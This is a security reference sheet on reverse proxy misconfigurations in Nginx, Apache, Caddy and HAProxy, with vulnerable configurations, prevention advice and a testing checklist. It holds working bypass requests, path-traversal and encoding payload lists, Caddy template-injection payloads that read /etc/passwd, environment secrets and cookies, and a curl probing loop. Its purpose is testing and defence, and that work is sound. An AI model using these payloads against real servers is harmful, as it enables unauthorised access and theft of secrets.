# Reverse Proxy Misconfigurations

## Description
Reverse proxy misconfigurations can lead to access control bypass, path traversal, header injection, and template injection. These vulnerabilities arise from improper configuration of proxy servers like Nginx, Apache, HAProxy, and Caddy.

## Common Vulnerability Types

### 1. Path Normalization Issues
### 2. Header Manipulation
### 3. Access Control Bypass
### 4. Template Injection

## Nginx Misconfigurations

### Off-By-Slash Vulnerability

**Vulnerable Configuration:**
```nginx
location /api {
    proxy_pass http://backend:8080/;
}
```

**Exploitation:**
```
Request: GET /api/../admin HTTP/1.1
Proxied: GET /../admin HTTP/1.1
Result: Access to /admin on backend
```

### Alias Path Traversal

**Vulnerable Configuration:**
```nginx
location /static {
    alias /var/www/static/;
}
```

**Exploitation:**
```
Request: GET /static../etc/passwd HTTP/1.1
Result: Reads /var/www/etc/passwd (path traversal)
```

**Secure Configuration:**
```nginx
location /static/ {
    alias /var/www/static/;  # Note trailing slash
}
```

### Missing Location Root

**Vulnerable Configuration:**
```nginx
server {
    root /var/www;
    location /api {
        proxy_pass http://backend;
    }
    # Missing location for /
}
```

**Exploitation:**
```
Request: GET /../../../etc/passwd HTTP/1.1
Result: May expose files outside root
```

### Unsafe Merge Slashes

```nginx
# If merge_slashes is off
merge_slashes off;

# Request with double slashes may bypass rules
GET //admin HTTP/1.1
```

## Header Manipulation

### X-Forwarded-For Spoofing

**Vulnerable Trust:**
```nginx
set_real_ip_from 0.0.0.0/0;  # Trusts all sources
real_ip_header X-Forwarded-For;
```

**Exploitation:**
```http
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
# Bypass IP-based access control
```

### Host Header Injection

**Exploitation:**
```http
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
```

### Custom Header Injection

```http
GET / HTTP/1.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

## Apache Misconfigurations

### RewriteRule Bypass

**Vulnerable Configuration:**
```apache
RewriteRule ^/admin - [F]  # Block /admin
ProxyPass / http://backend/
```

**Bypass:**
```
GET /Admin HTTP/1.1    # Case variation
GET /admin/ HTTP/1.1   # Trailing slash
GET //admin HTTP/1.1   # Double slash
GET /.;/admin HTTP/1.1 # Path confusion
```

### mod_proxy Path Issues

**Vulnerable Configuration:**
```apache
ProxyPass /api http://backend/api
```

**Exploitation:**
```
GET /api%2F..%2Fadmin HTTP/1.1
# URL-encoded path traversal
```

## Caddy Misconfigurations

### Template Injection

Caddy supports templates that can be exploited:

**Vulnerable:**
```caddy
:80 {
    templates
    file_server
}
```

**Exploitation Payloads:**
```
# Read files
{{.File "/etc/passwd"}}

# Environment variables
{{.Env.SECRET_KEY}}

# List directory
{{.Files "/var/www"}}

# Execute template functions
{{printf "%s" .Request.Host}}
```

### Request Manipulation
```
{{.Request.URL.Path}}
{{.Request.Header.Get "Authorization"}}
{{.Request.Cookie "session"}}
```

## HAProxy Misconfigurations

### ACL Bypass

**Vulnerable Configuration:**
```haproxy
acl restricted path_beg /admin
http-request deny if restricted
```

**Bypass:**
```
GET /Admin HTTP/1.1       # Case
GET /admin/ HTTP/1.1      # Trailing slash
GET /./admin HTTP/1.1     # Path normalization
GET /%61dmin HTTP/1.1     # URL encoding
```

### Header Manipulation
```http
GET / HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

## URL Parsing Discrepancies

### Different Interpretations
```
# Backend may interpret differently than proxy

/api/..;/admin          # Tomcat path parameter
/api/..%00/admin        # Null byte
/api/..%5c/admin        # Backslash encoding
/api\../admin           # Backslash traversal
/api/;/admin            # Semicolon handling
```

### Encoding Variations
```
%2e%2e%2f               # ../
%252e%252e%252f         # Double encoded ../
%c0%ae%c0%ae%c0%af      # Overlong UTF-8 ../
..%00/                  # Null byte
..%0d/                  # Carriage return
```

## Tools

### Kyubi (Nginx Alias Traversal)
```bash
# https://github.com/nickmakesstuff/nickmakesstuff.github.io
kyubi -u https://target.com
```

### gixy (Nginx Config Analyzer)
```bash
# https://github.com/yandex/gixy
gixy /etc/nginx/nginx.conf
```

### bypass-url-parser
```bash
# Test URL parsing bypass
python bypass-url-parser.py -u "https://target.com/admin"
```

### Manual Testing
```bash
# Test various bypasses
for bypass in "/../" "/.;/" "/%2e%2e/" "//"; do
    curl -s "https://target.com/api${bypass}admin" -o /dev/null -w "%{http_code}\n"
done
```

## Testing Checklist

- [ ] Test path traversal via proxy
- [ ] Test case variations for access control
- [ ] Test trailing slashes
- [ ] Test double slashes
- [ ] Test URL-encoded paths
- [ ] Test header injection (X-Forwarded-For, Host)
- [ ] Test custom headers (X-Original-URL)
- [ ] Check for template injection (Caddy)
- [ ] Test different encoding schemes
- [ ] Verify backend normalization

## Prevention

### Nginx
```nginx
# Validate paths
location /api/ {
    # Use trailing slashes consistently
    proxy_pass http://backend/api/;
}

# Restrict header trust
set_real_ip_from 10.0.0.0/8;  # Only trusted networks

# Disable merge_slashes carefully
# merge_slashes on;  # Default
```

### Apache
```apache
# Strict path matching
<LocationMatch "^/admin">
    Require all denied
</LocationMatch>

# Normalize URLs
AllowEncodedSlashes NoDecode
```

### General
```
1. Normalize paths before applying access control
2. Match on normalized URLs
3. Use consistent path handling
4. Validate Host headers
5. Don't trust client-provided IP headers
6. Disable unnecessary proxy features
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Proxy%20Misconfigurations
- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
- https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/
